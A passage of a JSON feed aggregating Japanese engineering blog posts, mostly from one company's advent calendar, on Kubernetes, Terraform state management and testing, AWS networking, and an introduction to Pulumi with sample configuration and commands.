ReplicaSet> PersistentVolumeClaim> Service> StatefulSet> Node> Pod> Deployment> Ingress> CronJob> ValidatingWebhookConfiguration> MutatingWebhookConfigurationUnused:> HTTPRoute> HorizontalPodAutoScaler...","isoDate":"2023-12-28T08:26:54.000Z","dateMiliSeconds":1703752014000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: 概要","link":"https://zenn.dev/tozastation/articles/737871319fb33b","contentSnippet":"K8sGPT とはIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptREADME.md の引用ですが、SRE Experience が Analyzerに体系化されており、最も関連性の高い情報を引き出してAIで補完するのに役立つと書かれています。 SRE Experien...","isoDate":"2023-12-28T07:16:37.000Z","dateMiliSeconds":1703747797000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Kubernetesのソースコードを読む Kubelet編","link":"https://qiita.com/ys1/items/7a455c602424e591fe38","contentSnippet":"起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2まず、Kubeletの起動処理について追っていきたいと思います。appパッケージのKubele...","isoDate":"2023-12-25T15:06:41.000Z","dateMiliSeconds":1703516801000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Terraformのtfstateについて考える","link":"https://blog.masasuzu.net/entry/2023/12/23/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named \\"terraform.tfstate\\", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend \\"s3\\" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput \\"vpc_id\\" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata \\"terraform_remote_state\\" \\"network\\" {  backend = \\"s3\\"  config {    bucket = \\"terraform-tfstate-network-xxxxx\\"    key    = \\"tfstate\\"    region = \\"ap-northeast-1\\"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。","isoDate":"2023-12-22T15:00:00.000Z","dateMiliSeconds":1703257200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"testcontainers-scala で快適なインテグレーションテストを実現する","link":"https://zenn.dev/nomadblacky/articles/173ea1f829eafa","contentSnippet":"この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...","isoDate":"2023-12-22T13:07:06.000Z","dateMiliSeconds":1703250426000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"AWS Network Firewall と NAT ゲートウェイの配置","link":"https://zenn.dev/toshikish/articles/d7d15cd01a8584","contentSnippet":"はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....","isoDate":"2023-12-22T07:17:39.000Z","dateMiliSeconds":1703229459000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Kubernetesに対する理解を高めてKubernetesの「わからない」を減らそう","link":"https://speakerdeck.com/bells17/kubernetesnidui-suruli-jie-wogao-metekubernetesno-wakaranai-wojian-rasou","contentSnippet":"Kubernetes Novice Tokyo #29 で発表したLT資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/300438/\\r動画URL: https://www.youtube.com/watch?v=WZHDlB8P9_4\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md  \\r\\rセッション内容の詳しい資料:\\rhttps://bells17.booth.pm/items/3129761\\rhttps://bells17.booth.pm/items/2649601\\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init\\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp\\rhttps://speakerdeck.com/bells17/kube-controller-managerru-men\\rhttps://speakerdeck.com/bells17/kube-proxyru-men\\rhttps://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru\\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive\\rhttps://speakerdeck.com/bells17/introduction-to-csi\\rhttps://speakerdeck.com/bells17/kubelet-and-containers\\rhttps://speakerdeck.com/bells17/cri-spec-and-dockershim-implementation","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83D\uDC19 KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://speakerdeck.com/hiroki_hasegawa/kubernetesnomarutitenantopatantoargocdnoshi-jian-tenantoshe-ji","contentSnippet":"『Kubernetes Novice Tokyo』の登壇資料です\\r\\r・Kubernetesのマルチテナントパターンの種類\\r・ArgoCDのAppProjectテナントとNamespacedスコープモード\\r・ArgoCDのテナントが防いでくれる誤った操作の具体例\\r\\rを紹介しました\\r\\rArgoCDのマニフェストの実装例を解説できませんでしたので、ぜひ元記事 (KubernetesのマルチテナントパターンとArgoCDの実践テナント設計) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1737778249021952458","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"【ArgoCD\uD83D\uDC19】\\"Kubernetes Novice Tokyo\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/12/21/833414","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類ArgoCDのAppProjectテナントとNamespacedスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例みんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『KubernetesのマルチテナントパターンとArgoCDの実践テナント設計』ていうテーマで、 Kubernetes Novice Tokyo に登壇したぞ！Kubernetes Novice Tokyo の登壇資料です！キミだけの最強のマルチテナントを作ろう✌️#k8snovicehttps://t.co/qNEhnkA7WZ— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 21, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-12-21T03:00:00.000Z","dateMiliSeconds":1703127600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと","link":"https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a","contentSnippet":"※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 です。株式会社スリーシェイクでクラウド型データ連携ツール「Reckoner（レコナー）」のプロダクトエンジニアしています。去年も書いていた...","isoDate":"2023-12-19T22:00:39.000Z","dateMiliSeconds":1703023239000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"terraform test: 細かい挙動","link":"https://zenn.dev/kyohei_saito/articles/eac62818b7217d","contentSnippet":"この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...","isoDate":"2023-12-18T14:58:00.000Z","dateMiliSeconds":1702911480000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesとCoreDNSについて理解する","link":"https://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #8 で発表したLT資料です\\r\\rイベントURL: https://3-shake.connpass.com/event/302755/\\r動画URL: https://www.youtube.com/watch?v=8JbfniqxNQk\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"bells17","authorId":"bells17"},{"title":"2023-12-18 SRETT8 Terraform使いがPulumiに入門する","link":"https://speakerdeck.com/masasuzu/2023-12-18-srett8-terraformshi-ikapuluminiru-men-suru","contentSnippet":"","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"terraform test: 応用機能","link":"https://zenn.dev/kyohei_saito/articles/52ce184522aae9","contentSnippet":"この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...","isoDate":"2023-12-17T14:58:00.000Z","dateMiliSeconds":1702825080000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"個人開発で要件定義、設計をした話","link":"https://kechigon.hatenablog.com/entry/2023/12/17/142140","contentSnippet":"現在、個人開発で麻雀戦績管理アプリを作っていて、要件定義や設計について考えたことを共有したいと思います。GitHub ↓github.comなぜやったのか自分はWebエンジニアを目指している大学生ですが、まともなWebアプリを開発した経験がなく、フロントからインフラまでフルスタックで開発しようと思い立ちました。最初は何をするか手探りの状態でしたが、その「何をするのか」を定義するために要件定義、設計から始めました。何をやったのかGitHubにissueを作成し、やるべきことを明確化していきました。要件定義ここではアプリケーションの機能や、なぜそのような機能にするのかを箇条書きしていきます。この作業を通してやることとやらないことが明確化され、実装もうっすら浮かんできます。実際の要件定義は以下のような感じになりました。- ユーザーはまずサインアップする   - ユーザー名、パスワードを設定する      - ユーザー名は一意でないといけない   - ユーザの削除機能はデータ整合性が複雑になるので作らない - サインアップ済みのユーザーはログインをする   - ユーザー名、パスワードを入力- セッション管理をし、セッションが張られていたらログインを省略し、ユーザーホーム画面に入る。- 親ユーザーが部屋を作り、他のユーザーを登録していく   - 作成できる部屋は10部屋まで   - 親は参加のためのパスワードを設定する   - 子は親に部屋IDとパスワードを共有してもらう   - 3人以上いないと対局結果は登録できない、四麻は四人   - 部屋の削除機能も必要- 各部屋のホーム画面では各部屋での自分の戦績が表示される- オフラインで対局した点数結果とそのユーザーと何家かをアプリに登録する   - 点数結果だけでいいの？      - 毎回上がり役とかを登録してると、面倒くさいと思う   - 三麻も登録できるようにする。   - 点数の合計点を計算し、ユーザーの入力をチェックする   - 同点の場合は、東寄りが上位- 取り消し機能も必要   - 「対局」という粒度で削除できるようにする。これは点数とユーザを登録したひと塊。      - 間違えてもその「対局」を消し、また新しい「対局」を作ればいい - 自分または同じ部屋のユーザーの成績を確認できるようにする    - 平均順位   - 一位率   - 二位率   - 三位率   - 四位率   - とび率   - 対局数   - 平均得点   - 各項目のランキングも出す   - 「n局以上」で検索できるようにする- 対局の登録、削除のたびに個人成績を計算しなおすデータベース設計ER図を書きます。要件定義にあるように今回のアプリではユーザーのログイン機能や、そのユーザーが作成、参加する部屋、その部屋ごとの戦績など、テーブルが複雑にリレーションを張るので設計に入る前に整理することができます。ある程度機能を盛り込む予定の個人開発では必須でしょう。画面遷移画面遷移図を書きます。ページとその機能、ページ同士の遷移を定義します。ここで定義したことはすなわちユーザーアクションのすべてなので、ユーザーアクションごとのテストがしやすくなります。実際の画面遷移図↓以上のような要件定義、設計を行うことで、実装での手戻りが少なくなり、快適に実装ができました。これからアプリケーション自体はほとんど完成しているので、コンテナ化し、それをECSやCloud Runにデプロイし、運用していく予定です！","isoDate":"2023-12-17T05:21:40.000Z","dateMiliSeconds":1702790500000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"terraform test: 基本機能","link":"https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97","contentSnippet":"この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...","isoDate":"2023-12-16T14:58:00.000Z","dateMiliSeconds":1702738680000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"Terraform使いがPulumiに入門しました","link":"https://blog.masasuzu.net/entry/2023/12/16/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from \\"@pulumi/pulumi\\";import * as aws from \\"@pulumi/aws\\";import * as awsx from \\"@pulumi/awsx\\";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket(\\"my-bucket\\");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from \\"@pulumi/aws\\";import * as terraform from \\"@pulumi/terraform\\";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference(\\"network\\", {    backendType: \\"local\\",    path: \\"/path/to/terraform.tfstate\\",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput(\\"vpc_id\\");const publicSubnetIds = networkState.getOutput(\\"public_subnet_ids\\");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: \\"ami-7172b611\\",        instanceType: \\"t2.medium\\",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform 